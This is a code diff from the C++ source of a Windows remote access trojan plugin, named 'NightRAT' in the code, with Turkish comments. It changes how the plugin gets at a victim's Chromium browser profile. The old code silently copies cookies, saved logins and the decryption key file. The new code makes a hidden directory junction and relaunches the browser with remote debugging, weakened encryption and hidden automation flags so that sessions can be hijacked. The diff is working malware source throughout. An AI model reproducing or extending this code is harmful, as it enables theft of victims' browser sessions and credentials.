@@ -1188,77 +1188,25 @@ static wstring get_browser_profile_path(const wstring& browserName) {
     return path;
 }
 
-static bool copy_directory(const wstring& source, const wstring& destination) {
-    // Ensure destination exists
-    SHCreateDirectoryExW(NULL, destination.c_str(), NULL);
+static bool create_junction(const wstring& junctionPath, const wstring& targetPath) {
+    // mklink /j <junction> <target>
+    wstring cmd = L"/c mklink /j \"" + junctionPath + L"\" \"" + targetPath + L"\"";
+    vector<wchar_t> cmdBuf(cmd.begin(), cmd.end());
+    cmdBuf.push_back(L'\0');
 
-    // To copy contents, source must end with \*
-    wstring src = source;
-    if (!src.empty() && src.back() != L'\\' && src.back() != L'/') src += L'\\';
-    src += L"*";
+    SHELLEXECUTEINFOW sei = { sizeof(sei) };
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NO_CONSOLE;
+    sei.lpVerb = L"open";
+    sei.lpFile = L"cmd.exe";
+    sei.lpParameters = cmdBuf.data();
+    sei.nShow = SW_HIDE;
 
-    // SHFileOperation requires double-null terminated strings
-    vector<wchar_t> from(src.begin(), src.end());
-    from.push_back(L'\0');
-    from.push_back(L'\0');
-
-    vector<wchar_t> to(destination.begin(), destination.end());
-    to.push_back(L'\0');
-    to.push_back(L'\0');
-
-    SHFILEOPSTRUCTW fileOp = {0};
-    fileOp.wFunc = FO_COPY;
-    fileOp.pFrom = from.data();
-    fileOp.pTo = to.data();
-    // FOF_NOCONFIRMMKDIR is important.
-    // We use FOF_NOERRORUI and FOF_SILENT to avoid any popups on the victim's screen.
-    fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_SILENT | FOF_NOERRORUI | FOF_RENAMEONCOLLISION;
-
-    return SHFileOperationW(&fileOp) == 0;
-}
-
-static void clean_profile(const wstring& profilePath) {
-    // Chromium kilit dosyalarını temizle
-    vector<wstring> filesToDelete = {
-        L"SingletonLock",
-        L"SingletonCookie",
-        L"SingletonSocket",
-        L"Lockfile"
-        // L"Local State" - BU DOSYA SİLİNMEMELİ! Oturumların (cookie) şifresini çözmek için gereken anahtarı içerir.
-    };
-
-    for (const auto& f : filesToDelete) {
-        wstring fullPath = profilePath + L"\\" + f;
-        DeleteFileW(fullPath.c_str());
+    if (ShellExecuteExW(&sei)) {
+        WaitForSingleObject(sei.hProcess, 5000);
+        CloseHandle(sei.hProcess);
+        return true;
     }
-
-    // Default klasörü içindeki kilitleri de temizle
-    wstring defaultPath = profilePath + L"\\Default";
-    DeleteFileW((defaultPath + L"\\Web Data-journal").c_str());
-    DeleteFileW((defaultPath + L"\\Cookies-journal").c_str());
-    DeleteFileW((defaultPath + L"\\History-journal").c_str());
-    DeleteFileW((defaultPath + L"\\Login Data-journal").c_str());
-
-    // Gereksiz Cache ve Geçici dosyaları temizleyerek hızı artır
-    SHFILEOPSTRUCTW fileOp = {0};
-    fileOp.wFunc = FO_DELETE;
-    fileOp.fFlags = FOF_NOCONFIRMATION | FOF_SILENT | FOF_NOERRORUI;
-
-    vector<wstring> dirsToDelete = {
-        defaultPath + L"\\Cache",
-        defaultPath + L"\\Code Cache",
-        defaultPath + L"\\GPUCache",
-        profilePath + L"\\ShaderCache",
-        profilePath + L"\\GrShaderCache"
-    };
-
-    for (const auto& d : dirsToDelete) {
-        vector<wchar_t> path(d.begin(), d.end());
-        path.push_back(L'\0');
-        path.push_back(L'\0');
-        fileOp.pFrom = path.data();
-        SHFileOperationW(&fileOp);
-    }
+    return false;
 }
 
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
@@ -1345,54 +1293,50 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         return;
                     }
 
-                    wstring sourceProfile = get_browser_profile_path(wRequestedPath);
+                    wstring sourceUserData = get_browser_profile_path(wRequestedPath);
+                    if (sourceUserData.empty()) {
+                        send_error("User Data directory not found.");
+                        return;
+                    }
 
                     wchar_t tempPath[MAX_PATH];
                     GetTempPathW(MAX_PATH, tempPath);
-                    wstring destProfile = tempPath;
-                    destProfile += L"NightRAT_";
-                    destProfile += exeName;
-                    destProfile += L"_Profile";
+                    wstring junctionPath = tempPath;
+                    junctionPath += L"NightRAT_";
+                    junctionPath += exeName;
+                    junctionPath += L"_Junction";
 
-                    if (!sourceProfile.empty()) {
-                        send_status("Profiller kopyalanıyor...");
-                        SHCreateDirectoryExW(NULL, destProfile.c_str(), NULL);
+                    // Mevcut junction varsa temizle (dizin olarak)
+                    RemoveDirectoryW(junctionPath.c_str());
 
-                        // Root seviyesindeki kritik dosyalar
-                        CopyFileW((sourceProfile + L"\\Local State").c_str(), (destProfile + L"\\Local State").c_str(), FALSE);
+                    send_status("Profil köprüsü oluşturuluyor...");
+                    if (!create_junction(junctionPath, sourceUserData)) {
+                        send_error("Failed to create profile junction.");
+                        return;
+                    }
 
-                        // Tüm profil klasörlerini (Default ve Profile X) tara ve kopyala
-                        WIN32_FIND_DATAW findData;
-                        HANDLE hFind = FindFirstFileW((sourceProfile + L"\\*").c_str(), &findData);
-                        if (hFind != INVALID_HANDLE_VALUE) {
-                            do {
-                                wstring name = findData.cFileName;
-                                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                    (name == L"Default" || name.find(L"Profile ") == 0)) {
-
-                                    wstring srcProfPath = sourceProfile + L"\\" + name;
-                                    wstring dstProfPath = destProfile + L"\\" + name;
-                                    SHCreateDirectoryExW(NULL, dstProfPath.c_str(), NULL);
-
-                                    vector<wstring> files = { L"Cookies", L"Login Data", L"Web Data", L"Preferences", L"Secure Preferences" };
-                                    for (const auto& f : files)
-                                        CopyFileW((srcProfPath + L"\\" + f).c_str(), (dstProfPath + L"\\" + f).c_str(), FALSE);
-
-                                    wstring srcNet = srcProfPath + L"\\Network";
-                                    wstring dstNet = dstProfPath + L"\\Network";
-                                    SHCreateDirectoryExW(NULL, dstNet.c_str(), NULL);
-                                    CopyFileW((srcNet + L"\\Cookies").c_str(), (dstNet + L"\\Cookies").c_str(), FALSE);
-                                }
-                            } while (FindNextFileW(hFind, &findData));
-                            FindClose(hFind);
-                        }
-                        clean_profile(destProfile);
+                    // İlk profili tespit et (Default veya Profile 1)
+                    wstring profileDir = L"Default";
+                    WIN32_FIND_DATAW findData;
+                    HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
+                    if (hFind != INVALID_HANDLE_VALUE) {
+                        do {
+                            wstring name = findData.cFileName;
+                            if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                                (name == L"Default" || name.find(L"Profile ") == 0)) {
+                                profileDir = name;
+                                break;
+                            }
+                        } while (FindNextFileW(hFind, &findData));
+                        FindClose(hFind);
                     }
 
                     send_status("Tarayıcı başlatılıyor...");
 
                     // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
-                    wstring args = L" --user-data-dir=\"" + destProfile + L"\""
+                    wstring args = L" --remote-debugging-port=9222"
+                                   L" --user-data-dir=\"" + junctionPath + L"\""
+                                   L" --profile-directory=\"" + profileDir + L"\""
                                    L" --no-sandbox"
                                    L" --disable-gpu"
                                    L" --window-size=1280,720"
@@ -1408,23 +1352,16 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-infobars"
                                    L" --disable-gpu-compositing"
                                    L" --force-cpu-draw"
-                                   L" --disable-features=AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,IsolateOrigins,site-per-process"
+                                   L" --disable-features=AppBoundEncryption,AppBoundEncryptionRequired,LockProfile"
                                    L" --password-store=basic"
                                    L" --disable-encryption-win"
                                    L" --restore-last-session"
                                    L" --allow-profiles-outside-user-dir"
                                    L" --no-pings"
                                    L" --disable-notifications"
-                                   L" --disable-extensions"
                                    L" --disable-component-update"
-                                   L" --disable-domain-reliability"
-                                   L" --no-proxy-server"
-                                   L" --disable-logging"
-                                   L" --disable-breakpad"
-                                   L" --disable-default-apps"
                                    L" --disable-blink-features=AutomationControlled"
-                                   L" --lang=en-US"
-                                   L" --enable-features=NetworkServiceInProcess";
+                                   L" --lang=en-US";
 
                     wstring fullCmd = L"\"" + exePath + L"\"" + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
